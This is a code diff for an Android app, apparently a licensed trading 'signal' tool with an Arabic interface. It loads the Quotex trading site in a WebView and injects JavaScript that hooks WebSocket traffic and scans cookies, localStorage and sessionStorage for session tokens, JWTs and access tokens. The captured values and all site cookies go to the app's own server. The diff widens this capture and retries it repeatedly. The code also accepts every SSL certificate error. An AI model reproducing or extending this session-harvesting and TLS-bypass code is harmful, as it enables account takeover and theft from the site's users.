@@ -3,15 +3,18 @@ package com.oscar.linker
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.SharedPreferences
+import android.graphics.Color
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.view.Gravity
 import android.view.ViewGroup
 import android.webkit.CookieManager
 import android.webkit.JavascriptInterface
 import android.webkit.WebResourceRequest
 import android.webkit.WebView
 import android.webkit.WebViewClient
+import android.widget.Button
 import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
@@ -32,11 +35,16 @@ import java.util.concurrent.TimeUnit
 class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
-    private lateinit var statusText: TextView
+    private lateinit var statusBar: TextView
+    private lateinit var btnSettings: Button
+    private lateinit var btnMarket: Button
     private lateinit var licenseKey: String
-    private var sent = false
     private lateinit var prefs: SharedPreferences
-    private var captureMode = false
+
+    private var currentTab = "settings"
+    private var linkingMode = false
+    private var lastSentSsid: String? = null
+    private var sentCount = 0
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -51,38 +59,25 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         prefs = getSharedPreferences("oscar_prefs", Context.MODE_PRIVATE)
-
-        val savedKey = prefs.getString("license_key", null)
-        if (savedKey.isNullOrBlank()) {
-            showKeyDialog()
-        } else {
-            licenseKey = savedKey
-            setupUi()
-            loadDashboard()
-        }
+        val saved = prefs.getString("license_key", null)
+        if (saved.isNullOrBlank()) showKeyDialog()
+        else { licenseKey = saved; setupUi(); showSettings() }
     }
 
     private fun showKeyDialog() {
-        val input = EditText(this).apply {
-            hint = "OSCAR-XXXX-XXXX-XXXX"
-            setSingleLine()
-        }
+        val input = EditText(this).apply { hint = "OSCAR-XXXX-XXXX-XXXX"; setSingleLine() }
         AlertDialog.Builder(this)
             .setTitle("🔑 أدخل مفتاح التفعيل")
-            .setMessage("ضع مفتاح OSCAR الخاص بك ثم اضغط متابعة")
+            .setMessage("ضع مفتاح OSCAR الخاص بك")
             .setView(input)
             .setCancelable(false)
             .setPositiveButton("متابعة") { _, _ ->
-                val key = input.text.toString().trim().uppercase()
-                if (key.isEmpty()) {
-                    Toast.makeText(this, "المفتاح مطلوب", Toast.LENGTH_SHORT).show()
-                    finish()
-                } else {
-                    licenseKey = key
-                    prefs.edit().putString("license_key", key).apply()
-                    setupUi()
-                    loadDashboard()
-                }
+                val k = input.text.toString().trim().uppercase()
+                if (k.isEmpty()) { finish(); return@setPositiveButton }
+                licenseKey = k
+                prefs.edit().putString("license_key", k).apply()
+                setupUi()
+                showSettings()
             }
             .setNegativeButton("إلغاء") { _, _ -> finish() }
             .show()
@@ -90,22 +85,46 @@ class MainActivity : AppCompatActivity() {
 
     @SuppressLint("SetJavaScriptEnabled")
     private fun setupUi() {
-        val root = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
+        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
+
+        statusBar = TextView(this).apply {
+            text = "📊 الإعدادات"
+            textSize = 14f
+            setTextColor(Color.WHITE)
+            setBackgroundColor(Color.parseColor("#1a1a1a"))
+            setPadding(30, 25, 30, 25)
+            gravity = Gravity.CENTER
         }
-        statusText = TextView(this).apply {
-            text = "جاري التحميل..."
-            textSize = 13f
-            setPadding(20, 20, 20, 20)
-        }
+
         webView = WebView(this).apply {
             layoutParams = LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT,
-                ViewGroup.LayoutParams.MATCH_PARENT
+                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f
             )
         }
-        root.addView(statusText)
+
+        val bottomBar = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            setBackgroundColor(Color.parseColor("#0d0d0d"))
+        }
+
+        btnSettings = Button(this).apply {
+            text = "📊 الإعدادات"
+            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
+            setOnClickListener { showSettings() }
+        }
+
+        btnMarket = Button(this).apply {
+            text = "📈 السوق"
+            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
+            setOnClickListener { showMarket() }
+        }
+
+        bottomBar.addView(btnSettings)
+        bottomBar.addView(btnMarket)
+
+        root.addView(statusBar)
         root.addView(webView)
+        root.addView(bottomBar)
         setContentView(root)
         configureWebView()
     }
@@ -124,92 +143,137 @@ class MainActivity : AppCompatActivity() {
         }
         CookieManager.getInstance().setAcceptCookie(true)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
-        webView.addJavascriptInterface(SessionBridge(), "OscarBridge")
+        webView.addJavascriptInterface(Bridge(), "OscarBridge")
 
         webView.webViewClient = object : WebViewClient() {
-            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
-                val url = request.url.toString()
-                if (url.startsWith("oscar://connect")) {
-                    startQuotexCapture()
-                    return true
-                }
-                return false
-            }
-
             override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
                 handler?.proceed()
             }
 
             override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                 super.onPageStarted(view, url, favicon)
-                if (url?.contains("quotex.com") == true) {
-                    injectWebSocketInterceptor()
-                }
+                if (url?.contains("quotex.com") == true) injectInterceptor()
             }
 
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
                 if (url.contains("quotex.com")) {
-                    injectWebSocketInterceptor()
-                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard") || url.contains("/ar/trade")) {
-                        if (captureMode) {
-                            statusText.text = "✅ تم اكتشاف تسجيل الدخول، جاري التقاط الجلسة..."
-                            tryReadLocalStorage()
-                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureFromCookies() }, 2000)
-                        }
+                    injectInterceptor()
+                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard")) {
+                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
+                        tryCaptureAll()
+                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 2000)
+                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 5000)
                     }
-                } else if (url.contains("signal-bott.onrender.com")) {
-                    statusText.text = "📊 لوحة التحكم"
-                    captureMode = false
                 }
             }
         }
     }
 
-    private fun loadDashboard() {
-        statusText.text = "📊 جاري فتح لوحة التحكم..."
-        captureMode = false
+    private fun showSettings() {
+        currentTab = "settings"
+        linkingMode = false
+        statusBar.text = "📊 الإعدادات"
+        updateTabButtons()
         webView.loadUrl("$BASE_URL/app_login/$licenseKey")
     }
 
-    private fun startQuotexCapture() {
-        sent = false
-        captureMode = true
-        statusText.text = "📱 سجّل دخولك إلى Quotex..."
+    private fun showMarket() {
+        currentTab = "market"
+        statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
+        updateTabButtons()
         webView.loadUrl("$QX_DOMAIN/ar/trade")
     }
 
+    private fun updateTabButtons() {
+        if (currentTab == "settings") {
+            btnSettings.setBackgroundColor(Color.parseColor("#d4af37"))
+            btnSettings.setTextColor(Color.BLACK)
+            btnMarket.setBackgroundColor(Color.parseColor("#2a2a2a"))
+            btnMarket.setTextColor(Color.WHITE)
+        } else {
+            btnSettings.setBackgroundColor(Color.parseColor("#2a2a2a"))
+            btnSettings.setTextColor(Color.WHITE)
+            btnMarket.setBackgroundColor(Color.parseColor("#d4af37"))
+            btnMarket.setTextColor(Color.BLACK)
+        }
+    }
+
+    private fun tryCaptureAll() {
+        tryCaptureFromCookies()
+        tryCaptureFromStorage()
+    }
+
     private fun tryCaptureFromCookies() {
-        if (sent || !captureMode) return
-        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN)
-        if (cookies != null) {
-            val ssid = extractCookie(cookies, "ssid")
-                ?: extractCookie(cookies, "session")
-                ?: extractCookie(cookies, "token")
-            if (ssid != null && ssid.length > 20) {
-                statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
-                sendToServer(ssid, cookies)
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: return
+        for (name in listOf("ssid", "session", "token", "authorization", "auth")) {
+            val v = cookies.split(";").map { it.trim() }
+                .firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
+            if (v != null && v.length > 20) {
+                sendSsid(v)
+                return
             }
         }
     }
 
-    private fun injectWebSocketInterceptor() {
+    private fun tryCaptureFromStorage() {
         val js = """
             (function() {
-                if (window.__oscarHooked) return;
-                window.__oscarHooked = true;
+                try {
+                    var keys = ['session','token','ssid','auth','authorization','user','account'];
+                    var found = null;
+                    function scan(storage) {
+                        for (var i = 0; i < keys.length; i++) {
+                            var v = storage.getItem(keys[i]);
+                            if (!v) continue;
+                            if (v.length > 20 && v.length < 5000 && !found) found = v;
+                            try {
+                                var o = JSON.parse(v);
+                                if (o) {
+                                    ['token','session','ssid','authorization','access_token'].forEach(function(k){
+                                        if (o[k] && typeof o[k] === 'string' && o[k].length > 20 && !found) found = o[k];
+                                    });
+                                }
+                            } catch(e){}
+                        }
+                    }
+                    scan(localStorage);
+                    scan(sessionStorage);
+                    if (found && window.OscarBridge) window.OscarBridge.onSsid(found);
+                } catch(e){}
+            })();
+        """.trimIndent()
+        webView.evaluateJavascript(js, null)
+    }
+
+    private fun injectInterceptor() {
+        val js = """
+            (function() {
+                if (window.__oscarHooked2) return;
+                window.__oscarHooked2 = true;
+
+                function push(v) {
+                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
+                        if (window.OscarBridge) window.OscarBridge.onSsid(v);
+                    }
+                }
+
                 var OrigWS = window.WebSocket;
                 var hookedWS = function(url, protocols) {
                     try {
-                        var m = url.match(/[?&]token=([^&]+)/);
-                        if (m && m[1] && m[1].length > 20) {
-                            if (window.OscarBridge) window.OscarBridge.onSsid(m[1]);
+                        if (url) {
+                            var patterns = [
+                                /[?&]token=([^&]+)/,
+                                /[?&]session=([^&]+)/,
+                                /[?&]ssid=([^&]+)/,
+                                /[?&]auth=([^&]+)/
+                            ];
+                            for (var i = 0; i < patterns.length; i++) {
+                                var m = url.match(patterns[i]);
+                                if (m && m[1]) push(decodeURIComponent(m[1]));
+                            }
                         }
-                        var s = url.match(/[?&]session=([^&]+)/);
-                        if (s && s[1] && s[1].length > 20) {
-                            if (window.OscarBridge) window.OscarBridge.onSsid(s[1]);
-                        }
-                    } catch(e) {}
+                    } catch(e){}
                     var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
                     try {
                         ws.addEventListener('message', function(ev) {
@@ -220,18 +284,20 @@ class MainActivity : AppCompatActivity() {
                                     /"session"\s*:\s*"([^"]+)"/,
                                     /"token"\s*:\s*"([^"]+)"/,
                                     /"ssid"\s*:\s*"([^"]+)"/,
-                                    /authorization["']?\s*[:=]\s*["']?([A-Za-z0-9_\-\.]{30,})/
+                                    /"authorization"\s*:\s*"([^"]+)"/,
+                                    /"access_token"\s*:\s*"([^"]+)"/,
+                                    /"jwt"\s*:\s*"([^"]+)"/
                                 ];
                                 for (var i = 0; i < pats.length; i++) {
-                                    var mm = d.match(pats[i]);
-                                    if (mm && mm[1] && mm[1].length > 20) {
-                                        if (window.OscarBridge) window.OscarBridge.onSsid(mm[1]);
-                                        break;
-                                    }
+                                    var m = d.match(pats[i]);
+                                    if (m && m[1]) { push(m[1]); break; }
                                 }
-                            } catch(e) {}
+                            } catch(e){}
                         });
-                    } catch(e) {}
+                        ws.addEventListener('open', function() {
+                            tryCapture();
+                        });
+                    } catch(e){}
                     return ws;
                 };
                 hookedWS.prototype = OrigWS.prototype;
@@ -245,41 +311,26 @@ class MainActivity : AppCompatActivity() {
         webView.evaluateJavascript(js, null)
     }
 
-    private fun tryReadLocalStorage() {
-        val js = """
-            (function() {
-                try {
-                    ['session','token','ssid','auth','authorization'].forEach(function(k) {
-                        var v = localStorage.getItem(k);
-                        if (v && v.length > 20) {
-                            var p = v;
-                            try { var o = JSON.parse(v); p = o.token || o.session || o.ssid || o.authorization || v; } catch(e) {}
-                            if (window.OscarBridge) window.OscarBridge.onSsid(p);
-                        }
-                    });
-                    ['session','token','ssid'].forEach(function(k) {
-                        var v = sessionStorage.getItem(k);
-                        if (v && v.length > 20 && window.OscarBridge) window.OscarBridge.onSsid(v);
-                    });
-                } catch (e) {}
-            })();
-        """.trimIndent()
-        webView.evaluateJavascript(js, null)
-    }
-
-    inner class SessionBridge {
+    inner class Bridge {
         @JavascriptInterface
         fun onSsid(ssid: String) {
-            if (sent || !captureMode || ssid.length < 20) return
-            sent = true
-            runOnUiThread { statusText.text = "🔗 جاري ربط حسابك بالسيرفر..." }
-            val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
-            sendToServer(ssid, cookies)
+            if (ssid.length < 20) return
+            sendSsid(ssid)
         }
 
         @JavascriptInterface
-        fun startConnect() {
-            runOnUiThread { startQuotexCapture() }
+        fun tryCapture() {
+            runOnUiThread { tryCaptureAll() }
+        }
+
+        @JavascriptInterface
+        fun openMarket() {
+            runOnUiThread { showMarket() }
+        }
+
+        @JavascriptInterface
+        fun openSettings() {
+            runOnUiThread { showSettings() }
         }
 
         @JavascriptInterface
@@ -289,11 +340,16 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun extractCookie(cookies: String, name: String): String? {
-        return cookies.split(";").map { it.trim() }.firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
-    }
+    private fun sendSsid(ssid: String) {
+        if (ssid == lastSentSsid && sentCount > 0) return
+        if (sentCount > 5) return
 
-    private fun sendToServer(ssid: String, cookies: String) {
+        lastSentSsid = ssid
+        sentCount++
+        statusBar.text = "🔗 جاري إرسال الجلسة للسيرفر (محاولة $sentCount)..."
+
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
+
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val payload = JSONObject().apply {
@@ -311,25 +367,23 @@ class MainActivity : AppCompatActivity() {
 
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        sent = false
-                        captureMode = false
-                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب بنجاح", Toast.LENGTH_LONG).show()
-                        Handler(Looper.getMainLooper()).postDelayed({ loadDashboard() }, 500)
+                        statusBar.text = "✅ تم ربط الحساب بنجاح! جاري العودة للإعدادات..."
+                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب", Toast.LENGTH_LONG).show()
+                        sentCount = 0
+                        Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                     } else {
-                        val err = json.optString("error", "خطأ غير معروف")
-                        AlertDialog.Builder(this@MainActivity)
-                            .setTitle("❌ فشل الربط")
-                            .setMessage("السبب: $err\n\nتأكد من تسجيل الدخول وحاول مرة أخرى.")
-                            .setCancelable(false)
-                            .setPositiveButton("إعادة المحاولة") { _, _ -> sent = false; startQuotexCapture() }
-                            .setNegativeButton("إلغاء") { _, _ -> sent = false; loadDashboard() }
-                            .show()
+                        val err = json.optString("error", "خطأ")
+                        statusBar.text = "⚠️ فشلت المحاولة $sentCount: $err"
+                        if (sentCount < 5) {
+                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 3000)
+                        } else {
+                            statusBar.text = "❌ لم نتمكن من التقاط الجلسة تلقائياً. اضغط على زر الإعدادات ثم حاول مجدداً"
+                        }
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    sent = false
-                    Toast.makeText(this@MainActivity, "خطأ في الاتصال: ${e.message}", Toast.LENGTH_LONG).show()
+                    statusBar.text = "⚠️ خطأ اتصال: ${e.message}"
                 }
             }
         }
@@ -337,6 +391,8 @@ class MainActivity : AppCompatActivity() {
 
     @Deprecated("Deprecated in Java")
     override fun onBackPressed() {
-        if (::webView.isInitialized && webView.canGoBack()) webView.goBack() else super.onBackPressed()
+        if (currentTab == "market") showSettings()
+        else if (::webView.isInitialized && webView.canGoBack()) webView.goBack()
+        else super.onBackPressed()
     }
 }
